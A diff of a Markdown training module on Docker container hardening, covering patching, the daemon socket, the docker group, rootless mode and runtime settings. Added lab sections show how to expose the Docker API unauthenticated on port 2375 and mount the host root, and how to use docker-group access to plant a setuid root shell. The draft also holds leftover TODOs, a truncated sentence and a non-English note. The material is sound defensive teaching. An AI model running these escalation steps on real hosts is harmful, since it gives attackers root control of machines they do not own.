@@ -1,90 +1,323 @@
 # Container Hardening Strategies
 
-If the previous module explained how attackers get in, this module explains how to make that foothold less useful.
+Container hardening is not one setting. It is a collection of choices that reduce privilege, reachability and writable surface. Good hardening does not make exploitation impossible. It makes post-exploitation slower, noisier, and less damaging. In other words, container hardening is mostly the art of saying **no** to unnecessary power.
 
-Container hardening is not one setting.
+## Common Mistakes - practical demonstration
 
-It is a collection of choices that reduce:
+These show up constantly:
 
-- privilege
-- reachability
-- writable surface
-- abuse of the kernel boundary
-- blast radius after compromise
+- running everything as root because it is easier
+- using `--privileged` to make problems go away
+- mounting Docker socket into app or CI containers
+- leaving shells and package managers in production images without a reason
+- disabling default seccomp or AppArmor profiles
+- forgetting resource limits
+- mounting large parts of the host filesystem
+- publishing ports widely and calling the environment "hardened"
 
-Good hardening does not make exploitation impossible.
+If a team does several of these, the environment is only cosmetically hardened.
 
-It makes post-exploitation slower, noisier, and less damaging.
 
-## Where This Fits In Part 04
+## Host and daemon hardening
 
-This module is the defensive backbone of the day.
+### Keep the host OS, kernel, Docker Engine, Docker Compose, and container runtime updated
 
-The red line is:
+Containers are not virtual machines; they **share the host kernel**. That means an outdated host kernel, Docker Engine, containerd, runc, or Docker Compose can become a direct path from “compromised container” to “compromised host.” This is why OWASP lists “Keep Host and Docker up to date” as Rule #0 in its Docker Security Cheat Sheet. A vulnerable application inside a container is bad, but a vulnerable container runtime is worse because the **runtime is the software enforcing the isolation boundary**. If that boundary has a known flaw, an attacker may be able to escape the container, read or modify host files, abuse the Docker API, cause denial of service, or gain higher privileges on the underlying system.
 
-1. web exploitation gets the attacker into the workload
-2. hardening limits what the workload can do after compromise
-3. secret management removes some of the most valuable post-exploitation targets
-4. observability tells you when hardening was bypassed or is being tested
+A practical example is the historical `runc` container escape vulnerability **CVE-2019-5736**. runc is one of the low-level tools used to start containers. In affected versions, an attacker who controlled a malicious container image, or who already had write access inside a container and could trigger docker exec, could overwrite the host runc binary and potentially gain root-level execution on the host. This is a perfect classroom example because it shows why “the app is inside a container” is not enough: if the runtime itself is vulnerable, the container boundary can fail.
 
-This module covers step 2.
+A newer example is **CVE-2024-21626**, another runc issue affecting Docker, Kubernetes, and other container platforms. CERT-EU described it as a high-severity vulnerability that could allow attackers to escape containers and gain unauthorized access to the host operating system. Red Hat also noted that exploitation could involve tricking a user into building or running a malicious image, or executing a malicious process inside a container with runc exec.
 
-## Learning Objectives
+The risk is not limited to container escape. Runtime and engine bugs can also produce denial-of-service conditions. For example, Ubuntu’s security advisory for containerd described vulnerabilities where an attacker could potentially cause denial of service, including through improper handling of goroutines during container attach operations. This matters because a single untrusted workload may be able to affect the stability of the whole Docker host if the runtime has a known resource-exhaustion bug.
 
-By the end of this lecture, participants should be able to:
+In practice, hardening means treating the Docker host like production infrastructure, not like a disposable developer tool. Administrators should patch the operating system, kernel, Docker Engine, Docker CLI, Docker Compose plugin, containerd, and runc as part of a regular maintenance process. They should also subscribe to [Docker security announcements](https://docs.docker.com/security/security-announcements/), because Docker publishes security updates and CVE notices for Docker components.
 
-- explain what container hardening is really trying to achieve
-- identify the main hardening layers for Docker-based workloads
-- apply practical runtime restrictions that materially reduce risk
-- explain the value of non-root execution, capability reduction, read-only filesystems, seccomp, AppArmor, and resource limits
-- distinguish meaningful hardening from security theater
+Example verification commands:
 
-## Suggested Timing
+```bash
+# Check host OS and kernel
+cat /etc/os-release
+uname -a
 
-This module works well as a 60-65 minute lecture:
+# Check Docker client and server versions
+sudo docker version
 
-| Time | Topic |
-| --- | --- |
-| 0-10 min | What hardening is and what it is not |
-| 10-22 min | Image and process hardening basics |
-| 22-38 min | Runtime restrictions that matter most |
-| 38-50 min | Host and daemon hardening |
-| 50-65 min | Practical baseline, common mistakes, best practices |
+# Check Docker Compose version
+sudo docker compose version
 
-## What Hardening Is Really About
+# Check runtime versions
+sudo docker info | grep -i runtime
+sudo containerd --version
+sudo runc --version
+```
 
-The wrong mental model is:
+Example update commands on Debian/Ubuntu-style systems:
+```bash
+# If Docker was installed from Docker's official repository:
+sudo apt update
+sudo apt upgrade
+```
 
-"we add a few flags and become secure."
+A container breakout is rarely caused by “Docker being insecure by default”; more often, it happens when a vulnerable runtime, weak configuration, excessive privileges, or an outdated host gives the attacker a path out. Keeping the host and Docker stack updated removes many known escape and denial-of-service paths before attackers can use them.
 
-The right mental model is:
+### Do not expose the Docker daemon over unauthenticated TCP
 
-"we remove power the application does not legitimately need."
+The Docker daemon is one of the most sensitive services on a Docker host because it controls image builds, container creation, volume mounts, networking, and access to host resources. By default, Docker listens on a local Unix socket, usually `/var/run/docker.sock`. Exposing the daemon over TCP, especially with something like `tcp://0.0.0.0:2375`, turns the Docker API into a network-accessible control plane. If that TCP listener is unauthenticated and reachable, anyone who can connect to it can effectively control Docker on that host. OWASP explicitly warns that enabling the TCP Docker daemon socket can expose unauthenticated and unencrypted direct access to the Docker daemon. Docker’s own documentation recommends protecting daemon access and using SSH or TLS when remote access is needed.
 
-That usually means:
+The practical risk is host compromise. An attacker does not need a kernel exploit or sophisticated container escape if they can talk directly to the Docker API. They can simply create a new container, mount the host filesystem into it, and access or modify host files. For example, if an attacker can run Docker API commands remotely, they may start a privileged container or mount `/` from the host into `/host` inside the container. From there, they could read secrets, modify SSH keys, alter system files, steal application data, or install persistence. This is why access to the Docker daemon is commonly treated as equivalent to root access on the host. OWASP makes the same point for Docker socket access: giving access to the Docker socket is effectively giving unrestricted root access to the host.
 
-- less privilege
-- fewer syscalls
-- fewer writable paths
-- fewer capabilities
-- less network exposure
-- less host coupling
+A vulnerable configuration often looks like this:
+```bash
+dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375
 
-In other words, container hardening is mostly the art of saying **no** to unnecessary power.
+# The dangerous part is: -H tcp://0.0.0.0:2375
+```
 
-## The Hardening Layers
+This means Docker is listening on all network interfaces, commonly without TLS. Port 2375 is the conventional plaintext Docker API port. If this is reachable from another machine, the attacker can point their Docker client at it.
 
-For a Docker-focused course, teach hardening in five layers:
+**Example** (do this example only in a safe lab environment, never in a public or production network):
+```bash
+# On the vulnerable host run
+sudo systemctl edit docker.service
 
-1. image hardening
-2. process and privilege hardening
-3. filesystem and runtime hardening
-4. daemon and host hardening
-5. policy and operational hardening
+# Paste the following into the editor
+[Service]
+ExecStart=
+ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375
 
-That structure helps people avoid treating hardening as only an image problem or only a runtime flag problem.
+# Apply and Restart
+sudo systemctl daemon-reload
+sudo systemctl restart docker
 
-## 1. Image Hardening
+# Run this command to see if Docker is now listening on that port:
+sudo ss -tulpn | grep 2375
+
+# From another machine, try to connect to the Docker API:
+sudo docker -H <victim_ip>:2375 ps
+
+# If that works, the attacker can likely create containers too:
+docker -H tcp://<victim_ip>:2375 run --rm -it -v /:/host alpine sh
+
+# Inside that container, the attacker can inspect the host filesystem:
+ls /host
+cat /host/etc/passwd
+ls /host/etc/hosts
+
+# Remove the vulnerable configuration after testing and restart Docker:
+sudo rm /etc/systemd/system/docker.service.d/override.conf
+sudo systemctl daemon-reload
+sudo systemctl restart docker
+
+# Check no longer listening on TCP:
+sudo ss -tulpn | grep 2375
+```
+
+You can check for this with the following commands:
+```bash
+sudo ss -tulpn | grep 2375
+docker info
+ps aux | grep dockerd
+systemctl cat docker
+cat /etc/docker/daemon.json
+```
+
+If remote administration is required, [prefer SSH-based Docker contexts](https://docs.docker.com/engine/security/protect-access/#use-ssh-to-protect-the-docker-daemon-socket) instead of opening the daemon directly. This is usually better because SSH gives you mature authentication, logging, key management, bastion-host support, and network restrictions without exposing the Docker API directly.
+
+The Docker daemon is not just another API; it is the control interface for the host’s container system. If it is exposed without authentication, the attacker effectively gets a remote root-like management interface. The secure default is Unix socket only. If remote access is needed, use SSH-based Docker contexts. If TCP is unavoidable, use mutual TLS, firewall restrictions, monitoring, and never expose plaintext unauthenticated 2375 to a network.
+
+### Do not mount `/var/run/docker.sock` into application containers
+
+Mounting `/var/run/docker.sock` into a container gives that container access to the Docker daemon API on the host. This is extremely dangerous because the Docker daemon controls container creation, volume mounting, networking, images, and many host-level operations. OWASP’s Docker Security Cheat Sheet is very direct about this: the Docker socket is the primary entry point for the Docker API, it is owned by root, and giving access to it is equivalent to giving unrestricted root access to the host.
+
+The risky pattern usually appears in Compose like this:
+```yaml
+services:
+  app:
+    image: myapp:latest
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+```
+
+A common mistake is thinking this is safe if the socket is mounted read-only:
+```yaml
+volumes:
+  - /var/run/docker.sock:/var/run/docker.sock:ro
+```
+
+This is misleading. The `:ro` flag applies to the socket file mount itself, but Unix socket communication is still possible. The container may still be able to send Docker API requests through the socket. So `:ro` does not turn Docker API access into safe read-only access.
+
+This issue often appears in CI/CD runners, reverse proxies, auto-updaters, monitoring agents, and “Docker management UI” containers. These tools sometimes need to discover containers or launch builds, so teams mount the socket as a shortcut. The problem is that if one of those tools has a web vulnerability, bad plugin, weak admin password, SSRF bug, command injection bug, or exposed dashboard, the attacker may inherit Docker host control.
+
+For CI/CD image building, use alternatives that do not require the host Docker socket where possible, such as rootless BuildKit, Kaniko, Buildah, Podman, remote builders, or a dedicated isolated build host. The exact choice depends on the environment, but the design principle is the same: build jobs should not receive direct control over the production Docker daemon.
+
+For tools that only need container metadata, prefer a restricted proxy in front of the Docker socket rather than exposing the raw socket. For example, a [Docker socket proxy](https://github.com/tecnativa/docker-socket-proxy) can restrict allowed API endpoints so a monitoring tool can list containers but cannot create privileged containers or mount host paths. This is still a sensitive component and must be carefully configured, but it is safer than raw socket exposure.
+
+For the example run: `sudo docker run -v /var/run/docker.sock:/var/run/docker.sock --name=myapp alpine`
+
+You can audit for socket mounts with:
+```bash
+sudo docker ps --format '{{.Names}}' | while read name; do
+  echo "== $name =="
+  sudo docker inspect "$name" \
+    --format '{{range .Mounts}}{{println .Source "->" .Destination}}{{end}}' \
+    | grep docker.sock || true
+done
+```
+
+You can also search Compose files:
+```bash
+grep -R "docker.sock" .
+```
+
+Mounting `/var/run/docker.sock` into a container gives the container the ability to control Docker on the host. If that container is compromised, the attacker can often create a new container with the host filesystem mounted and take over the host. Avoid this pattern for application containers. Use isolated build systems, rootless builders, dedicated build hosts, or tightly restricted socket proxies only when there is a clear operational need.
+
+### Restrict membership of the docker group; access to Docker is effectively privileged host access
+
+On Linux, users normally need root privileges to interact with the Docker daemon through `/var/run/docker.sock`. To make Docker easier to use, [many installations allow users to run Docker without sudo](https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user) by adding them to the docker group. This is convenient, but it is also a major security decision. Docker’s own documentation warns that the docker group grants root-level privileges to the user. In other words, being in the docker group should be treated almost the same as being allowed to run unrestricted sudo.
+
+The reason is simple: the Docker daemon usually runs as root, and members of the docker group can send commands to that daemon. A user in the docker group can create containers, mount host directories, change container networking, access volumes, inspect secrets accidentally placed in containers, and run images with dangerous options. Even if the user does not have sudo, Docker can become a path to host-level access. Docker’s security documentation explains that the Docker daemon attack surface must be protected because only trusted users should be allowed to control it.
+
+A practical exploitation example:
+
+1. Prerequisite: the attacker has a user account on the host and is a member of the docker group.
+```bash
+sudo usermod -aG docker $USER
+newgrp docker
+id
+```
+
+2. That user can start a container and mount the host filesystem:
+```bash
+docker run --rm -it -v /:/host ubuntu bash
+```
+
+3. If the container is running as root inside the container, file writes to the mounted host filesystem may also be possible depending on host protections, filesystem permissions, user namespaces, and mount options. A common privilege-escalation demonstration is creating a setuid shell on the host:
+```bash
+cp /bin/bash /host/tmp/rootbash
+chown root:root /host/tmp/rootbash
+chmod 4755 /host/tmp/rootbash
+exit
+```
+4. Now the attacker can run `/tmp/rootbash` on the host and get a root shell:
+```bash
+/tmp/rootbash -p
+id
+```
+
+This shows why docker group access is not a harmless convenience. The user did not need the root password. They abused Docker’s normal volume-mounting feature to interact with the host filesystem through a root-controlled daemon. A common insecure operational pattern is adding every developer, operator, CI account, or automation account to the docker group. This increases the blast radius. If any one of those accounts is phished, compromised through SSH keys, reused passwords, stolen CI tokens, or malware, the attacker may gain Docker daemon control and then host-level control.
+
+A better approach is to keep docker group membership very small and intentional: `getent group docker`
+
+Remove users who do not strictly need Docker access:
+```bash
+sudo gpasswd -d $USER docker
+newgrp docker
+```
+
+If developers need Docker on their laptops, that is a different risk model from production. On a developer workstation, being in the docker group may be acceptable if the user already owns the machine. On a shared server, jump host, CI runner, lab machine, or production system, it is much more dangerous because one user’s Docker access can become everyone’s host compromise.
+
+Membership in the docker group is not just “permission to run containers.” It is permission to control a root-owned daemon that can mount host filesystems and start powerful containers. Restrict the group to trusted administrators only, audit it regularly, remove stale users, avoid adding CI or application accounts casually, and treat Docker group membership with the same seriousness as unrestricted sudo.
+
+### Consider Docker rootless mode or userns-remap for additional isolation.
+
+Docker normally depends on a privileged daemon and Linux kernel isolation features. That means container security is partly about what happens inside the container, but also about how container users map back to the host. 
+
+Many people assume: “root inside the container is isolated, so it does not matter.” In practice, it does matter. If a container breakout, unsafe bind mount, runtime flaw, or misconfiguration lets container root interact with the host, container UID 0 may become a very powerful attacker. 
+
+**User namespaces reduce that risk by mapping container users to less-privileged host users.** [Docker documents `userns-remap`](https://docs.docker.com/engine/security/userns-remap/) as a way to isolate containers with a user namespace, and **Docker rootless mode** goes further by running both the Docker daemon and containers without root privileges. [Docker’s rootless documentation](https://docs.docker.com/engine/security/rootless/) explains the difference clearly: with `userns-remap`, the daemon still runs as root; with rootless mode, both the daemon and containers run without root privileges.
+
+
+<!-- TO DO HERE https://chatgpt.com/c/69fd9cb9-8fcc-8328-b6aa-fd3734c5c292 -->
+- https://github.com/containers/podman/blob/main/docs/tutorials/rootless_tutorial.md?utm_source=chatgpt.com
+- https://docs.docker.com/engine/security/rootless/
+
+
+**User namespaces reduce the danger of container root by mapping it to an unprivileged host identity.** userns-remap improves traditional Docker isolation, rootless Docker improves it further by removing the root daemon from the path, and Podman often makes this model easier because rootless, daemonless containers are central to its design. This does not replace other controls like dropping capabilities, read-only filesystems, seccomp, AppArmor/SELinux, and avoidi
+
+### Use host firewall rules carefully; Docker can add its own iptables / nftables rules.
+
+Run periodic benchmarks, for example CIS Docker Benchmark or Docker Bench for Security. CIS publishes secure configuration guidance for Docker, and Docker Bench automates many CIS-style checks. 
+
+- omenimo da je več v delu 3, ampak je povezano tudi s hardeningom
+
+## Image and Dockerfile hardening
+- https://docs.docker.com/dhi/core-concepts/hardening/
+- Use a trusted, minimal base image.
+- Pin base image versions; ideally pin by digest in production.
+- Use multi-stage builds so compilers, package managers, and build tools are not copied into the runtime image.
+- Use .dockerignore to keep secrets, Git history, local files, and build noise out of the image context.
+- Never store secrets in ARG, ENV, source code, image layers, or .npmrc / config files.
+- Use BuildKit secrets for private tokens used during build. Docker explicitly warns that build args and environment variables are inappropriate for build secrets because they can persist in the final image.
+- Create or use a dedicated non-root user.
+- Set USER in the Dockerfile.
+- Install only production dependencies.
+- Avoid unnecessary packages such as shells, curl, compilers, package managers, and debugging tools in the final image.
+- Clean package manager caches in the same layer where packages are installed.
+- Use COPY instead of ADD unless you specifically need ADD behavior.
+- Add a HEALTHCHECK where meaningful.
+- Label images with source, version, revision, and maintainer metadata.
+- Scan images in CI before publishing or deploying. Docker Scout can extract SBOM metadata and evaluate images against vulnerability advisories.
+
+- docker hardened images
+
+## Runtime and Docker Compose hardening
+ Run containers as a non-root UID/GID with user: "10001:10001" or similar.
+
+ Do not use privileged: true.
+
+ Drop all Linux capabilities by default with cap_drop: ["ALL"].
+
+ Add back only the capabilities actually needed, for example NET_BIND_SERVICE if binding to ports below 1024.
+
+ Use security_opt: ["no-new-privileges:true"].
+
+ Keep Docker’s default seccomp/AppArmor/SELinux protections enabled; do not disable them casually.
+
+ Use read_only: true for the container root filesystem.
+
+ Add explicit writable tmpfs mounts only where the app needs temporary writes, such as /tmp or /run.
+
+ Avoid host bind mounts where possible; prefer named volumes.
+
+ Make bind mounts read-only with :ro unless the container must write.
+
+ Do not mount sensitive host paths like /, /etc, /var/run, /proc, /sys, /dev, or Docker’s data directory.
+
+ Limit resources: memory, CPU, PIDs, file descriptors, and restart loops.
+
+ Use pids_limit, mem_limit, cpus, and ulimits.
+
+ Use init: true to handle zombie processes.
+
+ Use Compose secrets instead of environment variables for passwords, API keys, and certificates. Compose secrets are mounted under /run/secrets/<name> and are granted per service. 
+
+ Segment networks: frontend, backend, database/admin networks as separate networks.
+
+ Use internal: true for networks that should not have external connectivity.
+
+ Publish only required ports.
+
+ Bind host ports to 127.0.0.1 when traffic should only be local or behind a reverse proxy.
+
+ Avoid network_mode: host unless absolutely necessary.
+
+ Avoid pid: host, ipc: host, and uts: host.
+
+ Avoid devices: unless a device is explicitly required.
+
+ Use log limits so a noisy container cannot fill the disk.
+
+ Use health checks and controlled restart policies.
+
+ Do not use latest tags for production.
+
+Docker Compose supports controls such as cap_drop, security_opt, read_only, pids_limit, mem_limit, cpus, tmpfs, user, and network isolation. Compose docs also warn that publishing a port without a host IP binds to all interfaces by default.
+
+## Hardened deployment example
+
+
+
+### 1. Image Hardening
 
 By the time a container starts, many hardening choices were already made in the image.
 
@@ -105,7 +338,7 @@ Why this matters:
 
 Minimal or distroless-style images are not a magic solution, but they do reduce the amount of unnecessary software available to the attacker.
 
-## 2. Run As A Non-Root User
+### 2. Run As A Non-Root User
 
 This is one of the simplest and most valuable hardening steps.
 
@@ -119,7 +352,7 @@ Benefits:
 
 This also forces engineering discipline because applications that assume root often reveal other hidden design weaknesses.
 
-## 3. Avoid `--privileged` And Host Namespace Sharing
+### 3. Avoid `--privileged` And Host Namespace Sharing
 
 This should be taught as a bright red warning.
 
@@ -135,7 +368,7 @@ These settings often turn a container into "just a process on the host with extr
 
 When teams use them casually, they are trading away much of the isolation containers were supposed to provide.
 
-## 4. Drop Capabilities Aggressively
+### 4. Drop Capabilities Aggressively
 
 Linux capabilities split privileged operations into smaller units.
 
@@ -151,7 +384,7 @@ Why it matters:
 - many container escapes and abuse paths rely on privilege that is broader than the app actually needs
 - extra capabilities can make kernel interaction, network manipulation, or filesystem abuse easier
 
-## 5. Prevent In-Container Privilege Escalation
+### 5. Prevent In-Container Privilege Escalation
 
 Use `no-new-privileges`.
 
@@ -159,7 +392,7 @@ This helps stop the process from gaining new privileges through mechanisms such 
 
 That matters because a surprisingly large number of applications carry helper binaries or package leftovers they never meant to expose in a production threat model.
 
-## 6. Use Seccomp, AppArmor, Or SELinux
+### 6. Use Seccomp, AppArmor, Or SELinux
 
 This is where Linux security modules become very important.
 
@@ -184,7 +417,7 @@ The biggest recurring mistake is not using these controls too little.
 
 It is disabling them because they are "annoying during debugging."
 
-## 7. Make The Root Filesystem Read-Only When Possible
+### 7. Make The Root Filesystem Read-Only When Possible
 
 A read-only root filesystem is one of the most useful runtime hardening controls.
 
@@ -202,7 +435,7 @@ If the app needs writable space:
 
 This is a very practical control for modern web services.
 
-## 8. Limit Resource Abuse
+### 8. Limit Resource Abuse
 
 Resource controls are security controls too.
 
@@ -222,7 +455,7 @@ Set limits for:
 
 A hardened service should not be able to crush the whole host just because it was exploited or written badly.
 
-## 9. Control The Network Surface
+### 9. Control The Network Surface
 
 Networking is part of hardening, not a separate concern.
 
@@ -238,7 +471,7 @@ Basic network hardening patterns:
 
 This is where Part 03 and Part 04 connect directly.
 
-## 10. Protect The Docker Daemon And Socket
+### 10. Protect The Docker Daemon And Socket
 
 The Docker daemon is a high-value control plane.
 
@@ -253,7 +486,7 @@ High-priority rules:
 
 This is one of the most common "convenience shortcuts" that destroys the whole security model.
 
-## 11. Rootless Mode And User Namespace Isolation
+### 11. Rootless Mode And User Namespace Isolation
 
 Docker supports rootless mode and user-namespace remapping.
 
@@ -270,17 +503,6 @@ The key teaching point is:
 
 if you have not thought about this topic at all, your hardening posture is probably immature.
 
-## 12. Keep Host And Engine Updated
-
-This sounds boring.
-
-It is not.
-
-Containers share the host kernel.
-
-That means old kernels and old container runtimes directly undermine your security posture.
-
-Hardening that ignores patch level is mostly cosmetics.
 
 ## A Practical Hardened Service Baseline
 
@@ -316,20 +538,7 @@ But it is the right direction:
 - privilege escalation blocked
 - read-only configuration mount
 
-## Common Hardening Mistakes
 
-These show up constantly:
-
-- running everything as root because it is easier
-- using `--privileged` to make problems go away
-- mounting Docker socket into app or CI containers
-- leaving shells and package managers in production images without a reason
-- disabling default seccomp or AppArmor profiles
-- forgetting resource limits
-- mounting large parts of the host filesystem
-- publishing ports widely and calling the environment "hardened"
-
-If a team does several of these, the environment is only cosmetically hardened.
 
 ## How To Prioritize Hardening In Real Life
 
@@ -345,61 +554,3 @@ If a team cannot do everything at once, start with the highest-value controls:
 8. patch the host and engine
 
 That sequence gives a lot of value quickly.
-
-## Kubernetes Note
-
-This course is Docker-centered, but participants should still hear the broader point:
-
-Kubernetes Pod Security Standards encode the same philosophy.
-
-The **Restricted** profile is essentially the platform saying:
-
-"containers should not get powerful defaults unless they truly need them."
-
-That is the same mindset you want on a single-node Docker deployment.
-
-## Good Discussion Prompts
-
-- Which of our current containers are still running as root?
-- Where are we using host mounts or Docker socket mounts for convenience?
-- Which services could move to a read-only root filesystem with only small engineering work?
-- Which workloads truly need extra Linux capabilities?
-- If one app container were compromised today, which runtime control would slow the attacker down the most?
-
-## Bridge To The Next Module
-
-After hardening, the next thing attackers usually want is credentials.
-
-That is why the next module is about:
-
-- build-time secrets
-- runtime secrets
-- environment variables
-- mounted secret files
-- rotation
-- dynamic credentials
-
-If hardening limits what the attacker can do, secret management limits what they can steal.
-
-## Key Takeaways
-
-- Container hardening is about removing unnecessary power from the workload.
-- The biggest wins usually come from non-root execution, capability reduction, read-only filesystems, and avoiding dangerous host coupling.
-- Seccomp, AppArmor, and related kernel controls are real security boundaries and should not be disabled casually.
-- Resource limits and network design are part of hardening, not optional extras.
-- A hardened container is still exploitable if the app is vulnerable, but it is much harder to abuse effectively.
-
-## References
-
-- Docker Engine security overview: <https://docs.docker.com/engine/security/>
-- Docker rootless mode: <https://docs.docker.com/engine/security/rootless/>
-- Docker user namespace remapping: <https://docs.docker.com/engine/security/userns-remap/>
-- Docker seccomp security profiles: <https://docs.docker.com/engine/security/seccomp/>
-- Docker AppArmor profiles: <https://docs.docker.com/engine/security/apparmor/>
-- Protect the Docker daemon socket: <https://docs.docker.com/engine/security/protect-access/>
-- Docker resource constraints: <https://docs.docker.com/engine/containers/resource_constraints/>
-- Docker Compose services reference: <https://docs.docker.com/reference/compose-file/services/>
-- OWASP Docker Security Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html>
-- NIST SP 800-190, *Application Container Security Guide*: <https://csrc.nist.gov/pubs/sp/800/190/final>
-- Kubernetes Pod Security Standards: <https://kubernetes.io/docs/concepts/security/pod-security-standards/>
-- Docker minimal or distroless images: <https://docs.docker.com/dhi/core-concepts/distroless/>
